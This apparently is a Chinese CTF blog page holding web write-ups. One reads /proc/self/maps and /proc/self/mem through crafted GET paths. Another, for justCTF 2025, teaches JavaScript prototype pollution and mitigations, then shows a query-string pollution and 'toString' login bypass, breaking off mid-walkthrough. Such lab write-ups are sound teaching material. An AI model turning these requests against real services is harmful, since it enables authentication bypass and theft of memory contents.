class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()  <span class="comment"># 去除首尾 &#x27;/&#x27;，得到filename</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取 filename 文件内容</span></span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br></pre></td></tr></table></figure>

<p>读取 &#x2F;proc&#x2F;self&#x2F;maps 查看flag存放的偏移 offset</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=0&amp;length=100000000000.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/maps</span><br></pre></td></tr></table></figure>

<p>得到maps：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 11653</span><br><span class="line"></span><br><span class="line">7fe58e045000-7fe58e047000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fe58f5c8000-7fe58f5c9000 rw-s 00000000 00:01 5143                       /dev/zero (deleted)</span><br><span class="line">7fe58f5c9000-7fe58f5cb000 rw-p 00000000 00:00 0 </span><br><span class="line">7fe58f5cb000-7fe58f5cc000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7fe58f602000-7fe58f603000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffec822a000-7ffec824b000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffec83da000-7ffec83de000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffec83de000-7ffec83e0000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>根据本地python的对比测试，<code>mmap</code>后会有一个叫做 <code>/dev/zero (deleted)</code>的内存空间被分配出来<br>根据它的地址从<code>mem</code>中读取<code>mmap</code>到的flag</p>
<p>读取 <code>/proc/self/mem</code> 文件，<code>offset</code>设置为十进制的<code>0x7fe58f5c8000</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?offset=140623929442304&amp;length=4096.?offset=1&amp;length=100/.?offset=1&amp;length=100.?offset=1&amp;length=100/pro?offset=1&amp;length=100c/self/mem</span><br></pre></td></tr></table></figure>

<p>拿到FLAG</p>
<p><img src="/2025/10/10/junior/image-20250914010944252.png" alt="image-20250914010944252"></p>
<h3 id="safenote"><a href="#safenote" class="headerlink" title="safenote"></a>safenote</h3><p>功能：</p>
<p>xss限制：nounce限制脚本执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/10/junior/" data-id="cuidFuavr-DITUWKXviTXOchY" data-title="junior ctf web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-justCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/08/justCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-10-08T10:20:25.000Z" itemprop="datePublished">2025-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/08/justCTF2025/">justCTF2025</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="justCTF-2025"><a href="#justCTF-2025" class="headerlink" title="justCTF 2025"></a>justCTF 2025</h2><h3 id="positive-player"><a href="#positive-player" class="headerlink" title="positive_player"></a>positive_player</h3><h4 id="前置知识–JS原型链污染"><a href="#前置知识–JS原型链污染" class="headerlink" title="前置知识–JS原型链污染"></a>前置知识–JS原型链污染</h4><h5 id="原型链概念"><a href="#原型链概念" class="headerlink" title="原型链概念"></a>原型链概念</h5><p>JavaScript 的每个对象拥有一个原型对象，以该原型为模板、继承方法和属性；原型对象也可能拥有原型，并从中继承方法和属性，以此类推。这种关系常被称为<strong>原型链</strong> (prototype chain)。</p>
<p>任何对象的祖先原型都是 <code>object.prototype</code>。</p>
<h6 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h6><p><strong>一、<em>proto</em>_ 属性</strong></p>
<p>每个对象实例都有的一个内部属性，指向该对象的“原型对象”，即该对象从哪里继承属性和方法</p>
<p>可通过 <code>__proto__</code> 访问其原型对象</p>
<p><strong>二、prototype 属性</strong></p>
<p>函数（包括构造函数）的一个属性</p>
<p>本质上是一个模板对象，新实例会继承它上面的属性和方法</p>
<p><strong>三、constructor 属性</strong></p>
<p>默认存在于函数的 <code>prototype</code> 对象上。</p>
<p>指向创建该 <code>prototype</code> 对象的构造函数本身。如 <code>A.prototype.constructor</code> 默认指向 <code>A</code>。</p>
<h6 id="重要关系"><a href="#重要关系" class="headerlink" title="重要关系"></a>重要关系</h6><p>任意对象可通过属性 <code>__proto__</code> 访问其原型对象，即 <code>obj.__proto__ == Object.prototype</code></p>
<p>实例对象可以通过原型链访问到 <code>constructor</code> 属性，即：<code>obj.constructor.prototype</code> &#x3D;&#x3D;&#x3D; <code>Object.prototype</code>。比如：</p>
<h5 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h5><p>JavaScript类的所有属性都允许被公开的访问和修改，包括属性 <code>__proto__</code> ，<code>constructor</code>和<code>prototype</code>。</p>
<p>原型污染指的是攻击者能够修改应用程序或库使用的对象原型（通常是 <code>Object.prototype</code>）的属性，且被所有经过该原型链的对象所继承，从而导致不可预期的行为，如拒绝服务攻击（通过触发JavaScript异常）或者远程代码执行等。</p>
<p>原型链污染目的是在<code>Object.prototype</code>上造成污染，主要有两种场景：</p>
<p>​	不安全的对象递归合并</p>
<p>​	按路径定义属性</p>
<h6 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h6><p>递归合并函数<code>merge()</code>的基本逻辑和代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 符合模式一：obj[a][b] = value</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若 <code>source</code> 包含<strong>可枚举</strong>属性 <code>__proto__</code>， 则可以新增&#x2F;修改 <code>tagret[__proto__]</code> 属性</p>
<p>以下代码存在原型链污染漏洞：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title function_">merge</span>(obj, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">// 此时 obj.__proto__.isAdmin = true</span></span><br><span class="line"><span class="comment">// 而 obj.__proto__ 就是 Object.prototype（因为 obj 是 &#123;&#125;）</span></span><br><span class="line"><span class="comment">// 所以 Object.prototype.isAdmin = true</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">isAdmin</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>即使 <code>user</code> 是新对象，也“自动”获得了 <code>isAdmin: true</code>。</p>
<h6 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h6><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。如以下的函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将对象object的指定路径path的属性值修改为value</span></span><br><span class="line"><span class="title function_">theFunction</span>(object, path, value)</span><br></pre></td></tr></table></figure>

<p>如果攻击者可以控制路径<code>path</code>的值，那么将路径设置为<code>_proto_.value</code>，运行theFunction函数后就有可能将<code>value</code>属性注入到object的原型中</p>
<p>如joint.js中的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setByPath = <span class="keyword">function</span>(<span class="params">obj, path, value, delimiter</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(path) ? path : path.<span class="title function_">split</span>(delimiter || <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> last = keys.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> diver = obj;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; last; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> key = keys[i];</span><br><span class="line">        <span class="keyword">const</span> value = diver[key];</span><br><span class="line">        <span class="comment">// diver creates an empty object if there is no nested object under such a key.</span></span><br><span class="line">        <span class="comment">// This means that one can populate an empty nested object with setByPath().</span></span><br><span class="line">        diver = value || (diver[key] = &#123;&#125;); <span class="comment">//自动创建中间层级：如果路径中的某层不存在，自动创建为&#123;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    diver[keys[last]] = value;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>setByPath</code>函数在对象 <code>obj</code> 中，将 <code>path</code> 路径对应的属性设置为 <code>value</code></p>
<p>输入以下的路径，那就会造成原型污染：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jointjs = <span class="built_in">require</span>(<span class="string">&quot;jointjs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + obj.<span class="property">polluted</span>);</span><br><span class="line">jointjs.<span class="property">util</span>.<span class="title function_">setByPath</span>(&#123; &#125;, <span class="string">&#x27;__proto__/polluted&#x27;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + obj.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>假设后端检查权限，通过污染让所有对象都有 <code>isAdmin: true</code> → 直接获得管理员权限</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user.<span class="property">isAdmin</span>) <span class="title function_">grantAdminAccess</span>();</span><br></pre></td></tr></table></figure>

<h6 id="绕过属性检查"><a href="#绕过属性检查" class="headerlink" title="绕过属性检查"></a>绕过属性检查</h6><p>如果污染了 <code>Object.prototype.hasOwnProperty</code>，就可以绕过检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">    <span class="comment">// 以为安全</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h6><p>通常发生在代码程序执行了对象上的一个特殊属性。如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(someobject.<span class="property">someattr</span>)</span><br></pre></td></tr></table></figure>

<p>在这种情况下，如果攻击者污染了 <code>Object.prototype.someattr</code> ，那么就可能导致远程代码执行。</p>
<h6 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h6><p>通常发生在 <code>Object</code> 对象持有的一些方法被隐式调用（如<code>toString</code> 和 <code>valueOf</code>）。</p>
<p>攻击者可以污染 <code>Object.prototype.someattr</code> 并改变为一个程序非预期的值，如<code>Int</code> 或 <code>Object</code>，可能导致程序无法正常工作，从而造成DoS。</p>
<h5 id="原型污染防范"><a href="#原型污染防范" class="headerlink" title="原型污染防范"></a>原型污染防范</h5><ol>
<li><p>过滤关键字： <code>__proto__</code> 、 <code>prototype</code>和 <code>constructor</code> 属性</p>
</li>
<li><p>避免使用不规范的递归。即使使用也要严格检查<code>key</code>，不能是<code>__proto__</code>和<code>constructor</code>。</p>
</li>
<li><p>考虑使用不带原型的对象，从而打断原型链。如<code>Object.create(null)</code>。</p>
</li>
<li><p>使用<code>Map</code>替换<code>Object</code>。</p>
</li>
</ol>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>由 Gemini 生成的 Express 应用，包括用户注册、登录功能和自定义主题等功能。</p>
<p>注册用户 user1&#x2F;123 ，登录之后可看到的页面如右图</p>
<img src="../../../web/web/images/n268d9Iwz0R2lINrdUdkWAAhVh6WIiD6dp5vufXtCtU.png" alt="image" style="zoom:67%;" />

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><strong>一、定位关键字 <code>flag</code></strong></p>
<p>分析源码，搜索关键字 <code>flag</code> ，发现如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>代码逻辑如下：</p>
<p>1）用户访问 &#x2F;flag 页面时触发该处理器</p>
<p>2）首先验证用户是否成功登录</p>
<p>3）若成功登录，判断是否具备管理员权限；若具备则返回FLAG，反之返回 Not admin</p>
<p>结合上述分析，需要一个具备管理员权限的用户，登录成功后访问 &#x2F;flag 路径即可获得FLAG。</p>
<p><strong>二、定位危险函数 <code>deepMerge</code></strong> </p>
<p>分析源码发现，定义了递归合并函数 <code>deepMerge</code> ，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. A function to recursively merge objects</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">deepMerge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="title class_">Object</span> &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(source[key], <span class="title function_">deepMerge</span>(target[key], source[key]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">assign</span>(target || &#123;&#125;, source);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>函数作用是将 <code>source</code> 对象的所有可枚举属性地复制到 <code>target</code>（有可能为{}）上。</p>
<p>存在递归合并函数时，考虑原型链污染漏洞。</p>
<p><strong>三、分析原型链污染的可能性</strong></p>
<p>查找函数调用链，发现 <code>app.get(&#39;theme&#39;,....)</code> 调用 <code>deepMerge</code> ，部分代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/theme` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/theme&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// 解析请求参数，过滤关键字 __proto__，prototype，constructor等</span></span><br><span class="line">  <span class="keyword">const</span> parsedUpdates = <span class="title function_">parseQueryParams</span>(queryString);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(parsedUpdates).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用deepMerge</span></span><br><span class="line">    user.<span class="property">themeConfig</span> = <span class="title function_">deepMerge</span>(user.<span class="property">themeConfig</span>, parsedUpdates);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是在调用 <code>parseQueryParams</code> 函数之前，先调用<code>parseQueryParams</code>函数解析请求参数，过滤了 <code>[&#39;__proto__&#39;, &#39;prototype&#39;, &#39;constructor&#39;]</code> 等关键字。代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. A function to parse a query string with dot-notation keys.</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">parseQueryParams</span> = (<span class="params">queryString</span>) =&gt; &#123;</span><br><span class="line">  .....</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="keyword">const</span> path = key.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    .....</span><br><span class="line">      <span class="comment">// 过滤关键字</span></span><br><span class="line">      <span class="keyword">if</span>([<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">includes</span>(part))&#123;</span><br><span class="line">        part = <span class="string">&#x27;__unsafe$&#x27;</span> + part;</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>故直接污染 <code>object.prototype.isAdmin</code>的思路行不通</p>
<p><strong>四、原型链污染扩展</strong></p>
<p>再次查看获取 <code>flag</code> 的相关代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 关键判断</span></span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>关键代码是 <code>users[req.session.userId].isAdmin == true</code> ，其中：</p>
<p>​	<code>req.session.userId</code> 在用户登录认证通过后赋值为 <code>username</code> </p>
<p>​	<code>users</code> 初始化为 {} ，在用户注册成功后存入数据 <code>&#123; username: &#123; password, userThemeConfig, isAdmin &#125; &#125;</code></p>
<p>可知<code>users.__proto__</code> 就是 <code>Object.prototype</code> ，如下：</p>
<style>.msrgddjsentt{zoom: 67%;}</style><img src="/2025/10/08/justCTF2025/image-20250812193235289-1762219779844-12.png" class="msrgddjsentt" alt="image-20250812193235289-1762219779844-12">

<p>故<code>users</code> 除了自身的属性：<code>user1</code> 之外；还有继承自原型（即 <code>Object</code>）的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等</p>
<p><code>users[req.session.userId]</code> 本质上是获取users的一个属性，所以 <code>req.session.userId</code> 不一定是合法的用户名（如 <code>user1</code>），也可以是 <code>users</code> 的其它属性（如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等），只要保证<code>users[某属性]</code> 返回非空的结果即可</p>
<p>然后确保 <code>users[某属性]</code> 的<code>.isAdmin</code> 值为 1，就可以使得 <code>if</code> 条件判断为真，进获取 <code>FLAG</code> 。</p>
<p>综上所述，攻击思路如下：</p>
<p>​	1）通过原型链污染原型Object的属性（如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toString</code> 等），在该受污染属性上添加 <code>isAdmin</code> 、并将值设置为1 。</p>
<p>​	2）尝试以该属性名称为 <code>username</code> 注册&#x2F;登录系统，则 <code>users[受污染属性].isAdmin</code>  值为1 ，然后访问 <code>/flag</code> 即可获取FLAG。</p>
<p>第1步前面已讨论过，存在递归合并函数 <code>deepMerge</code> ，可以实现原型链污染。下面讨论第2步如何实现以特殊用户（属性名称）登录系统</p>
<p><strong>五、登录认证绕过</strong></p>
<p>尝试以原型Object的属性名称注册&#x2F;登录用户，以 <code>toString</code> 为例（使用其它继承自<code>Object</code>的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toLocalString</code> 等都可以）。</p>
<p>理想情况是先注册、再登录。但是在注册时提示用户已经存在：</p>
<style>.ypkeveociwbd{zoom: 50%;}</style><img src="/2025/10/08/justCTF2025/image-20250812201006695.png" class="ypkeveociwbd" alt="image-20250812201006695">

<p>查看注册相关的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="comment">// 判断用户名是否存在</span></span><br><span class="line">  <span class="keyword">if</span> (users[username]) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">errorMessage</span> = <span class="string">&#x27;User already exists!&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>如前所述，<code>users</code> 的原型为 <code>Object</code> 。当 <code>username</code> 为 <code>toString</code>时，因为<code>users</code>自身不包含 <code>toString</code> 属性，故<code>users[username]</code> 返回的是<code>users.__proto__.toString</code> 即<code>Object.toString</code> 方法。如下：</p>
<style>.oakanotptrdh{zoom:67%;}</style><img src="/2025/10/08/justCTF2025/image-20250812201644955.png" class="oakanotptrdh" alt="image-20250812201644955">

<p><code>users[username]</code>非空，返回用户已存在，所以没有办法再次注册。</p>
<p>尝试 <code>toString/123</code> 直接登录，调试发现执行到304行验证用户名和密码时，关键变量的值如下：</p>
<p><img src="/2025/10/08/justCTF2025/image-20250812202547181-1762342243354-5.png" alt="image-20250812202547181"></p>
<p>​	<code>user</code> 值为 <code>Object.toString()</code> 方法，非空；</p>
<p>​	<code>user.password</code> &#x3D;&#x3D; <code>toString().password</code> &#x3D;&#x3D; <code>undefined</code></p>
<p>故要想通过304行的检查，将变量 <code>password</code> 的值设置为 <code>undefined</code> 即可。这样就可以绕过认证，以用户名 <code>toString</code> 成功登录系统。</p>
<p><strong>六、攻击步骤</strong></p>
<p>结合以上分析，可执行的攻击步骤如下：</p>
<ol>
<li>污染原型属性 <code>Object.toString</code></li>
</ol>
<p>原型链污染发生的函数为 <code>deepMerge</code>，其调用链为：</p>
<p>​	 <code>app.get(&#39;/theme&#39;,isAuthenticated,...)</code>  –&gt;  <code>parseQueryParams</code>  –&gt;  <code>deepMerge</code> </p>
<p>访问 &#x2F;theme 时需要用户已经登录，故先注册、登录普通用户 <code>user1</code> ，然后通过传递 <code>toString.isAdmin=1</code> 的查询参数，污染 <code>Object.prototype.toString</code>，在<code>toString</code>上添加 <code>isAdmin</code>、并将值置为 1 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 原型污染 url</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.148</span>:<span class="number">3000</span>/theme?toString.isAdmin=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>访问过程中<code>parseQueryParams</code> 函数会生成对象：</p>
